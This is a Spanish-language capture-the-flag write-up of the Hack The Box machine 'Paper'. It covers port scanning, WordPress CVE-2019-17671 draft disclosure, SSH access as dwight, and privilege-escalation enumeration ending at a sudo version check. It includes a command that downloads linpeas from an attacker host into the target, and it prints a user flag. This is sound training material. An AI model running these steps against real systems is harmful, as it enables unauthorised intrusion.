---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Paper

`Paper` es una máquina Linux sencilla que cuenta con un servidor Apache en los puertos 80 y 443, que sirven las versiones HTTP y HTTPS de un sitio web respectivamente. El sitio web en el puerto 80 devuelve una página web de servidor predeterminada, pero el encabezado de respuesta HTTP revela un dominio oculto. Este dominio oculto ejecuta un blog de WordPress, cuya versión es vulnerable a [CVE-2019-17671](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2). Esta vulnerabilidad nos permite ver la información confidencial almacenada en los borradores de las publicaciones del blog, que revelan otra URL que conduce a un sistema de chat para empleados. Este sistema de chat se basa en Rocketchat. Al leer los chats, descubrimos que hay un bot en ejecución al que se puede consultar información específica. Podemos explotar la funcionalidad del bot para obtener la contraseña de un usuario en el sistema. Una enumeración adicional de hosts revela que la versión sudo es vulnerable a [CVE-2021-3560](https://www.exploit-db.com/exploits/50011) y puede explotarse para elevar privilegios a root.

<figure><img src="../../.gitbook/assets/Paper.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.143 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 19:33 CET
Initiating SYN Stealth Scan at 19:33
Scanning 10.10.11.143 [65535 ports]
Discovered open port 80/tcp on 10.10.11.143
Discovered open port 443/tcp on 10.10.11.143
Discovered open port 22/tcp on 10.10.11.143
Completed SYN Stealth Scan at 19:33, 19.13s elapsed (65535 total ports)
Nmap scan report for 10.10.11.143
Host is up, received user-set (0.15s latency).
Scanned at 2025-02-17 19:33:26 CET for 19s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.25 seconds
           Raw packets sent: 66074 (2.907MB) | Rcvd: 66096 (2.645MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.143
	[*] Open ports: 22,80,443

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,80,443 10.10.11.143 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-17 19:38 CET
Nmap scan report for office.paper (10.10.11.143)
Host is up (0.088s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: WordPress 5.2.3
|_http-title: Blunder Tiffin Inc. &#8211; The best paper company in the elec...
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   107.25 ms 10.10.16.1
2   40.77 ms  office.paper (10.10.11.143)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.38 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb http://10.10.11.143/
http://10.10.11.143/ [403 Forbidden] Apache[2.4.37][mod_fcgid/2.3.9], Country[RESERVED][ZZ], Email[webmaster@example.com], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], MetaGenerator[HTML Tidy for HTML5 for Linux version 5.7.28], OpenSSL[1.1.1k], PoweredBy[CentOS], Title[HTTP Server Test Page powered by CentOS], UncommonHeaders[x-backend-server], X-Backend[office.paper]
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -I http://10.10.11.143
HTTP/1.1 403 Forbidden
Date: Mon, 17 Feb 2025 18:42:04 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
```



```bash
❯ cat /etc/hosts | grep office.paper
10.10.11.143 office.paper 
```



```bash
❯ whatweb http://office.paper
http://office.paper [200 OK] Apache[2.4.37][mod_fcgid/2.3.9], Bootstrap[1,5.2.3], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9], IP[10.10.11.143], JQuery, MetaGenerator[WordPress 5.2.3], OpenSSL[1.1.1k], PHP[7.2.24], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Blunder Tiffin Inc. &#8211; The best paper company in the electric-city Scranton!], UncommonHeaders[link,x-backend-server], WordPress[5.2.3], X-Backend[office.paper], X-Powered-By[PHP/7.2.24]
```



<figure><img src="../../.gitbook/assets/5112_vmware_2WA2OHSKZL.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u http://office.paper/ -t 200 -C 500,502,404
                                                                                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://office.paper/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      239c http://office.paper/wp-content => http://office.paper/wp-content/
301      GET        7l       20w      237c http://office.paper/wp-admin => http://office.paper/wp-admin/
301      GET        7l       20w      240c http://office.paper/wp-includes => http://office.paper/wp-includes/
301      GET        7l       20w      235c http://office.paper/manual => http://office.paper/manual/
200      GET      132l      508w     4349c http://office.paper/wp-content/themes/techup/assets/js/navigation.js
200      GET        2l      281w    10056c http://office.paper/wp-includes/js/jquery/jquery-migrate.min.js
301      GET        7l       20w      247c http://office.paper/wp-content/plugins => http://office.paper/wp-content/plugins/
200      GET       50l      220w    18041c http://office.paper/wp-content/uploads/2021/06/Dunder_Mifflin_Inc-150x150.png
200      GET       22l      155w    16878c http://office.paper/wp-content/uploads/2021/06/Dunder_Mifflin_Inc.png
200      GET      616l     1171w    14122c http://office.paper/wp-content/themes/techup/assets/js/custom.js
200      GET      154l      262w     2912c http://office.paper/wp-content/themes/techup/assets/css/skin-2.css
```



```bash
❯ wfuzz --hh=199691 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.office.paper" http://office.paper 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://office.paper/
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                             
=====================================================================

000000329:   200        507 L    13015 W    223163 Ch   "chat"  
```



```bash
❯ cat /etc/hosts | grep office.paper
10.10.11.143 office.paper chat.office.paper
```



<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



```bash
❯ wpscan --no-banner --url http://office.paper/ --enumerate vt,vp,u --random-user-agent --api-token "API_TOKEN" > result.txt

❯ cat result.txt
```



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2019-17671" %}

{% hint style="danger" %}
En WordPress anterior a 5.2.4, es posible la visualización no autenticada de cierto contenido porque la propiedad de consulta estática es manejada inapropiadamente.
{% endhint %}



{% embed url="https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2/" %}

<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (12).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (14).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (19).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (20).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (21).png" alt=""><figcaption></figcaption></figure>



```bash
❯ ssh dwight@office.paper
dwight@office.paper's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ cat user.txt 
7f6d8b3de479b93d9327ee27dc63df29
```

## Privilege Escalation



```bash
[dwight@paper ~]$ id
uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
[dwight@paper ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dwight: 
Sorry, user dwight may not run sudo on paper.
[dwight@paper ~]$ find / -perm -4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/fusermount3
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/userhelper
/usr/sbin/mount.nfs
```



```bash
❯ ls -l linpeas.sh
.rw-r--r-- kali kali 806 KB Sun Feb 16 03:40:22 2025  linpeas.sh
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```





```bash
[dwight@paper tmp]$ wget 10.10.16.3/linpeas.sh; chmod +x linpeas.sh
--2025-02-17 14:12:16--  http://10.10.16.3/linpeas.sh
Connecting to 10.10.16.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 824942 (806K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                                100%[==================================================================================================================================>] 805.61K   795KB/s    in 1.0s    

2025-02-17 14:12:17 (795 KB/s) - 'linpeas.sh' saved [824942/824942]
```



<figure><img src="../../.gitbook/assets/5134_vmware_QRAl577PFG.png" alt=""><figcaption></figcaption></figure>



```bash
[dwight@paper tmp]$ which sudo
/usr/bin/sudo
[dwight@paper tmp]$ /usr/bin/sudo --version
Sudo version 1.8.29
Sudoers policy plugin version 1.8.29
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.29
```

























































